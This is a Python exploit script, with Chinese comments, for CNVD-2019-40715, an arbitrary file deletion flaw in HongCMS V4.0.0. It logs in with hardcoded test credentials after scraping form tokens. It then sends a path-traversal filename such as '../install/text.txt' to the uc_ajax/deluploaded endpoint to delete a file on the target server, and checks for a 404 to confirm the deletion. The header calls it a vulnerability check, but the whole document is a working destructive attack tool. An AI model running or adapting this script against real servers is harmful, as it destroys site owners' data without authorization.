#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CNVD-2019-40715
# Written by: 秋水
# Company: 泽鹿安全
#

from bs4 import BeautifulSoup
import time
import requests
import datetime
import optparse

code = 'CNVD-2019-40715'
version = '1.0'
author = '秋水'
vulDate = '2020-04-09'
createDate = '2020-04-09'
updateDate = '2020-04-09'
name = 'HongCMS前台存在任意文件删除漏洞(CNVD-2019-40715)'
appPowerLink = 'http://www.hongcms.com'
appName = 'HongCMS'
appVersion = '''HongCMS V4.0.0'''
way = '''python CNVD-2019-40715.py -u http://127.0.0.1  -f ../install/text.txt'''


# 打印当前时间
def nowtime():
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return now


# 程序结束
def endtime():
    print(" ")
    time.sleep(0.3)
    print("*] shutting down at %s" % datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


# 输出基本信息
def output():
    # f = Figlet(font='slant')  # 斜体 不slant是默认的字体 是不倾斜的
    # code1 = f.renderText(code)
    print(" ")
    # print(code1)  # 里面写需要的生成的文字，只支持英文
    print(" ")
    time.sleep(0.3)
    print("[*] 漏洞名称：%s" % name)
    time.sleep(0.3)
    print("[*] 影响版本：%s" % appVersion)
    time.sleep(0.3)
    print("[*] 使用方式：%s" % way)
    time.sleep(0.3)
    print("[*] 脚本版本：%s" % version)
    time.sleep(0.3)
    print("[*] 更新日期：%s" % updateDate)
    time.sleep(0.3)
    print("  ")
    print('''***********************************
           开始检测漏洞
***********************************''')
    print("  ")


def check():
    try:
        rsp = session.get(url)
        text = rsp.text
        soup = BeautifulSoup(text, "html.parser")
        time.sleep(0.3)
        print("[*] %s 正在获取页面cookie..." % nowtime())
        key = soup.find("input", {'name': 'key'}).get("value")
        cookie = soup.find("input", {'name': 'code'}).get("value")
        time.sleep(0.3)
        print("[+] 获取成功！")
        print("[*] %s 正在尝试登录..." % nowtime())
        data = {
            "key": "%s" % key,
            "code": "%s" % cookie,
            "username": "test",
            "password": "123456"
        }
        address = url + "/index.php/ajax/login"
        rsp1 = session.post(address, data=data)
        text1 = rsp1.json()
        if rsp1.status_code == 200 and text1['s'] == 1:
            time.sleep(0.3)
            print("[+] 登录成功！")
            count = file.count("../", 0, len(file))
            if count == 1:
                char = "/"
                char1 = "\\"
                if file.find(char1) != -1:
                    time.sleep(0.3)
                    print("[-] 请规范输入文件名！如：../install/text.txt")
                    endtime()
                elif file.find(char) != -1:
                    num = file.find(char)
                    filename = file[num:]
                    time.sleep(0.3)
                    print("[*] %s 正在删除文件..." % nowtime())
                    address1 = url + "/index.php/uc_ajax/deluploaded?action=deleteone&file=%s" % file
                    rsp2 = session.get(address1)
                    text2 = rsp2.json()
                    if rsp2.status_code == 200 and text2['s'] == 1:
                        address2 = url + filename
                        r = session.get(address2)
                        if r.status_code == 404:
                            time.sleep(0.3)
                            print("[+] 文件删除成功！")
                            endtime()
                        else:
                            time.sleep(0.3)
                            print("[-] 文件删除失败！")
                            endtime()
                    else:
                        time.sleep(0.3)
                        print("[-] 文件删除失败！")
                        endtime()
                else:
                    time.sleep(0.3)
                    print("[-] 请规范输入文件名！如：../install/text.txt")
                    endtime()
            else:
                time.sleep(0.3)
                print("[-] 为了系统稳定，请不要尝试删除系统文件！")
                endtime()
        else:
            time.sleep(0.3)
            print("[-] 登录失败！")
            endtime()

    except requests.exceptions.ConnectionError:
        print("[-] 目标网站无法访问")
        endtime()
    except requests.exceptions.MissingSchema:
        print("[-] 目标网站格式不合法")
        endtime()


if __name__ == "__main__":
    # noinspection PyBroadException
    try:
        usage = "python %prog -u/-U <target url> -f/-F <filename>"  # 用于显示帮助信息
        parser = optparse.OptionParser(usage)  # 创建对象实例
        parser.add_option('-u', '-U', dest='url', action='store', help='target url',
                          default=False)  # 需要的命令行参数
        parser.add_option("-f", '-F', dest='file', action='store', help='fileName', default=False)
        (options, args) = parser.parse_args()
        session = requests.session()
        file = options.file
        if options.url:
            url = options.url
            output()
            check()
        else:
            parser.print_help()
            endtime()

    except BaseException as e:
        print("[-] 请输入参数值！")
        endtime()
